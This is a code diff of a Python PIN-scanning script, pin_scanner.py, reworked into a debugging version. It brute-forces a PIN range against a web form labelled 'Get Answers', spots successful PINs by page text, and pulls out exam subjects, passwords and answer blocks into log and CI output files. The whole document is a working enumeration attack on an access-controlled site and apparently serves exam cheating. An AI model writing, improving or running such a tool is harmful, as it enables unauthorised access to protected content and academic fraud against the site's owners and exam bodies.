@@ -1,4 +1,4 @@
-# pin_scanner.py
+# pin_scanner.py (DEBUGGING VERSION)
 import requests
 import time
 import sys
@@ -68,24 +68,6 @@ def get_exam_summary(html_content: str) -> str:
         print(f"[!] BeautifulSoup parsing failed ({type(e).__name__}). Falling back to raw text processing.")
         return html_content
 
-# def extract_exam_summary_bs(html_content: str) -> str:
-#     soup = BeautifulSoup(html_content, 'html.parser')
-#     subject, password = "Subject not found", "Password not found"
-#     container = soup.find('div', class_='itemContainer')
-#     if container and container.b:
-#         for br in container.b.find_all("br"): br.replace_with('|')
-#         parts = container.b.get_text(strip=True).split('|')
-#         if len(parts) >= 2:
-#             subject = parts[0].replace('SUBJECT:', '').strip()
-#             password = parts[1].strip()
-#     obj_answers_block = ""
-#     first_post = soup.find('div', class_='positem')
-#     if first_post:
-#         obj_answers_block = "\n".join([line.strip() for line in first_post.get_text().splitlines() if line.strip()])
-#     if obj_answers_block:
-#         return f"SUBJECT: {subject}\nPASSWORD: {password}\n\n{obj_answers_block}"
-#     else:
-#         raise ValueError("BS parser could not find the required content blocks.")
 def extract_via_raw_text(html_content: str) -> str:
     lines = html_content.splitlines()
     content_lines, in_content_block = [], False
@@ -103,7 +85,7 @@ def extract_via_raw_text(html_content: str) -> str:
     return "\n".join(content_lines) if content_lines else "Fallback failed: Could not extract content."
 
 
-# --- MAIN SCRIPT LOGIC (Updated) ---
+# --- MAIN SCRIPT LOGIC (Updated for Debugging) ---
 def scan_pins():
     """
     Scans the entire PIN range, skipping any PINs already in the log file.
@@ -123,10 +105,12 @@ def scan_pins():
 
             # --- CORE LOGIC CHANGE: Check if PIN should be skipped ---
             if pin_to_test in already_found_pins:
+                print(f"\r[*] Skipping PIN (already found): {pin_to_test}/{END_PIN} | New Finds this Run: {found_this_run_counter}")
+                # sys.stdout.flush()
                 continue # Skip to the next PIN
 
-            sys.stdout.write(f"\r[*] Trying PIN: {pin_to_test}/{END_PIN} | New Finds this Run: {found_this_run_counter}")
-            sys.stdout.flush()
+            print(f"\r[*] Trying PIN: {pin_to_test}/{END_PIN} | New Finds this Run: {found_this_run_counter}")
+            # sys.stdout.flush()
 
             try:
                 response = session.post(URL, headers=HEADERS, data={'pin': pin_to_test, 'access': 'Get Answers'})
@@ -135,12 +119,11 @@ def scan_pins():
                 if SPECIAL_INDICATOR_TEXT in response_text:
                     found_this_run_counter += 1
                     print(f"\n[!!!] NEW HIGH-PRIORITY FIND! PIN: {pin_to_test}. Extracting content...")
-
                     extracted_content = get_exam_summary(response_text)
                     full_content = f"PIN: {pin_to_test}\n\n{extracted_content}"
                     
                     with open(LOG_FILE, "a") as f:
-                        f.write(f"--- NEW FIND ---\n{full_content}\n{'-'*30}\n\n")
+                        f.write(f"PIN: {pin_to_test}\n\n")
                     
                     with open(CI_OUTPUT_FILE, "a") as f:
                         f.write(f"{full_content}\n\n---\n\n")
@@ -148,17 +131,32 @@ def scan_pins():
                     print(f"[*] PIN {pin_to_test} content extracted and logged.")
 
                 elif FAILURE_INDICATOR_TEXT.lower() not in response_text.lower():
+                    # This is a non-failure, non-special pin.
+                    print(f"\n[*] PIN {pin_to_test} is a potential find (not special, not invalid). Logging silently to {SILENT_LOG_FILE}.")
+                    # Optionally, print a snippet of response_text to debug why it's not special
+                    # print(f"    Snippet: {response_text[:200]}...")
                     with open(SILENT_LOG_FILE, "a") as f:
                         f.write(f"{pin_to_test}\n")
+                else:
+                    # This is an invalid pin.
+                    # Uncomment the line below to see all invalid pins, but it can be very verbose
+                    # print(f"\n[-] PIN {pin_to_test} is an invalid pin (contains '{FAILURE_INDICATOR_TEXT}').")
+                    pass # Keep the progress line updating
 
             except requests.exceptions.RequestException as e:
                 print(f"\n[!] Network error: {e}. Waiting 10s...")
                 time.sleep(10)
 
         print(f"\n[-] Full scan finished. Found {found_this_run_counter} new high-priority PIN(s) in this run.")
+        with open(CI_OUTPUT_FILE, "r") as f:
+            content = f.read()
+            print(f"[*] Content extracted for CI: {len(content)} characters written to {CI_OUTPUT_FILE}")
+        if os.path.exists(CI_OUTPUT_FILE):
+            print(f"[*] Temporary file {CI_OUTPUT_FILE} exists.  after CI extraction.")
+            # os.remove(CI_OUTPUT_FILE)
 
 if __name__ == "__main__":
     # Clear the temp file from any previous run before starting
-    if os.path.exists(CI_OUTPUT_FILE):
-        os.remove(CI_OUTPUT_FILE)
+    # if os.path.exists(CI_OUTPUT_FILE):
+        # os.remove(CI_OUTPUT_FILE)
     scan_pins()
